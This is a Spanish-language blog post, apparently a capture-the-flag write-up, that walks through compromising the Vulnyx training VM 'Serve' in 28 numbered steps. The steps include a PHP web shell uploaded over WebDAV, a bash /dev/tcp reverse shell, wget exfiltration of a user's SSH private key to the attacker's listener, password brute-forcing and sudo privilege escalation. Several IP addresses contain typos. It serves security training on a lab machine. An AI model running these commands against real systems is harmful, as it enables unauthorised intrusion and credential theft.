@@ -1,0 +1,231 @@
+---
+layout: post
+title: "Serve"
+date: 2024-04-16 11:20:23
+category: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Serve </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link OVA:</strong><a href="https://vulnyx.com/#serve"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![serve](/notas/public/img/vulnyx/serve/serve_pc.png){:.margin}
+
+**1\.** Verificamos dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![serve](/notas/public/img/vulnyx/serve/arp-scan.png){:.margin}
+
+
+**2\.** Escanemos puertos abiertos en el host objetivo.
+
+`sudo nmap -p -sS -sCV --open --min-rate=5000 -n -Pn 192.168.1.12 -oN report_scan`
+
+![serve](/notas/public/img/vulnyx/serve/nmap.png){:.margin}
+
+**3\.** Visitando el servicio apache, no tenemos nada importante.
+
+`http://192.168.1.12`
+
+![serve](/notas/public/img/vulnyx/serve/80.png){:.margin}
+
+**4\.** Fuzzeamos en busca de directorios.
+
+`gobuster dir -u http://191.168.1.12/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
+
+![serve](/notas/public/img/vulnyx/serve/gobuster.png){:.margin}
+
+- Vistamos la primera ruta y nos dice que no tenemos permisos.
+
+`http://192.168.1.12/javascript/`
+
+- En la segunda ruta tampoco se ve nada importante.
+
+`http://192.168.1.12/secrets/`
+
+- En el tercer directorio, tenemos un panel login, pero no tenemos credenciales.
+
+`http://192.168.1.12/webdav/`
+
+![serve](/notas/public/img/vulnyx/serve/webdav.png){:.margin}
+
+**5\.** Seguimos fuzzeando, ahora contemplamos la busqueda de ficheros.
+
+`gobuster dir -u http://192.168.1.12/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt`
+
+![serve](/notas/public/img/vulnyx/serve/gobuster_files.png){:.margin}
+
+**6\.** Revisamos el fichero notes haber que nos muestra.
+
+`http://192.168.1.12/notes.txt`
+
+![serve](/notas/public/img/vulnyx/serve/notes_txt.png){:.margin}
+
+**7\.** Fuzzeamos el directorio secret, tambien contemplamos ficheros kdbx.
+
+`gobuster dir -u http://192.168.1.12/secrets/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,kdbx`
+
+![serve](/notas/public/img/vulnyx/serve/kdbx.png){:.margin}
+
+**8\.** Nos descargamos el fichero db.kdbx visitando a esta url.
+
+`http://192.168.1.12/secrets/db.kdbx`
+
+**9\.** Creamos un hash que represente la contraseña del fichero.
+
+`ls`
+
+`keepass2john db.kdbx > kepass.txt`
+
+![serve](/notas/public/img/vulnyx/serve/keepass2john.png){:.margin}
+
+**10\.** Aplicamos bruteforce al hash para obtener la contraseña. 
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt kepass.txt`
+
+![serve](/notas/public/img/vulnyx/serve/john.png){:.margin}
+
+**11\.** Abrimos keepass y asu vez abrimos la base de datos db.kdbx .
+
+-   pasos para tener keepass:
+
+```
+    https://keepassxc.org/
+    chmod +x KeePassXC-2.7.7-x86_64.AppImage
+    ./KeePassXc-2.7.7-x86_64.AppImage & disown
+```
+
+![serve](/notas/public/img/vulnyx/serve/open_keepass.png){:.margin}
+
+**12\.** Abrimos la nota, tenemos credenciales para webdav. 
+
+![serve](/notas/public/img/vulnyx/serve/open_admin.png){:.margin}
+
+_- No sabemos el numero de empleado para reemplazar las X._
+![serve](/notas/public/img/vulnyx/serve/keepass_show_cred.png){:.margin}
+
+**13\.** Creamos un diccionario reemplazando cada X por un numero.
+
+`crunch 9 9 -t w3bd4v%%% -o dict.txt`
+
+![serve](/notas/public/img/vulnyx/serve/crunch.png){:.margin}
+
+**14\.** Usamos hydra para bruteforcear el panel login de webdav.
+
+`hydra -l admin -P dict.txt -f 192.168.1.12 http-get /webdav`
+
+![serve](/notas/public/img/vulnyx/serve/hydra.png){:.margin}
+
+_- Ya con credenciales accedemos a webdav; está vacio._
+
+![serve](/notas/public/img/vulnyx/serve/log_webdav.png){:.margin}
+
+**15\.** Creamos un archivo para mediante un parámetro en la url poder ejecutar comandos.
+
+`echo "<?php system($_GET['cmd']);?>" > cmd.php`
+
+![serve](/notas/public/img/vulnyx/serve/echo.png){:.margin}
+
+**16\.** Lo subimos al servidor apache.
+
+`curl --digest --user 'admin:w3bd4v513' -T 'cmd.php' 'http://192.168.1.12/webdav/'`
+
+![serve](/notas/public/img/vulnyx/serve/curl.png){:.margin}
+
+**17\.** Probamos si funciona ejecutando un comando al azar.
+
+`http://102.168.1.12/webdav/cmd.php?cmd=id`
+
+![serve](/notas/public/img/vulnyx/serve/id.png){:.margin}
+
+**18\.** Nos ponemos en escucha en en puerto.
+
+`sudo nc -nlvp 443`
+
+![serve](/notas/public/img/vulnyx/serve/nc.png){:.margin}
+
+**19\.** Nos enviamos una reverse-shell a nuestro nc.
+
+`http://192.168.1.12/webdav/cmd.php?cmd=bash -c "bash -i>%26/dev/tcp/192.168.1.9/443 0>%261"`
+
+![serve](/notas/public/img/vulnyx/serve/reverse_shell.png){:.margin}
+
+_- Obtenemos la conexión a la máquina:_
+
+![serve](/notas/public/img/vulnyx/serve/connected_nc.png){:.margin}
+
+**20\.** Revisamos permisos sudo disponibles.
+
+`sudo -l`
+
+![serve](/notas/public/img/vulnyx/serve/sudo_l.png){:.margin}
+
+**21\.** Nos ponemos en escucha en otro puerto, y usando wget nos enviamos el contenido del idrsa del usuario teo.
+
+`sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 192.168.1.9:4444`
+
+![serve](/notas/public/img/vulnyx/serve/idrsa_nc.png){:.margin}
+
+**22\.** Copiamos y guardamos la idrsa en un fichero.
+
+`nano id_rsa`
+
+![serve](/notas/public/img/vulnyx/serve/nano_idrsa.png){:.margin}
+
+**23\.** Utilizamos [RSAcrack](https://github.com/d4t4s3c/RSAcrack) para crackear la contraseña.
+
+`RSAcrack -w /usr/share/wordlists/rockyou.txt -k id_rsa`
+
+![serve](/notas/public/img/vulnyx/serve/rsacrack.png){:.margin}
+
+**24\.** Ahora accedemos por ssh como el usuario teo proporcionando la contraseña obtenida.
+
+`ssh -i id_rsa teo@192.168.1.12`
+
+![serve](/notas/public/img/vulnyx/serve/ssh.png){:.margin}
+
+**25\.** Revisamos permisos sudo del usuario, vemos que podemos ejecutar el binario 'bro' como root.
+
+`sudo -l`
+
+![serve](/notas/public/img/vulnyx/serve/teo_sudo_l.png){:.margin}
+
+**26\.** Si ejecutamos este binario, nos dice que ejecutemos como 'bro curl'.
+
+`sudo bro`
+
+![serve](/notas/public/img/vulnyx/serve/bro.png){:.margin}
+
+**27\.** Una vez ejecutado, al final(:) nos lanzamos una bash. 
+
+`!/bin/bash`
+
+![serve](/notas/public/img/vulnyx/serve/sudo_bro_puntos.png)
+![serve](/notas/public/img/vulnyx/serve/sudo_bro_bash.png)
+
+**28\.** Ya logrado el super-usuario en la máquina, finalizamos obteniendo la flag de root. 
+
+`cat /root/root.txt`
+
+![serve](/notas/public/img/vulnyx/serve/flag.png)
+
+<br>
+
+##### **_finalizado._**
